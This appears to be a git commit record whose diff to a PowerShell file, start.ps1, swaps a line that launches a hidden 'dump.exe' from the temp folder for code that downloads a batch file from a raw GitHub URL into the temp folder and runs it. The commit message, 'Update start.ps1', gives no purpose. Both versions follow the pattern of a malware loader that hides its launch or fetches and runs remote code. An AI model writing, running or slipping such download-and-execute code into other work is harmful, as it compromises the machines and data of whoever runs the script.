d94c9fd71cc1d46f94a31b3b17953e0dbad4a58f
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-05-01 19:46:08 +0700

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,1 +1,4 @@
-Start-Process -FilePath "$env:TEMP\dump.exe" -WindowStyle Hidden
+$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/n.bat"
+$output4 = "$env:TEMP\n.bat"
+Invoke-WebRequest -Uri $url4 -OutFile $output4
+& $output4
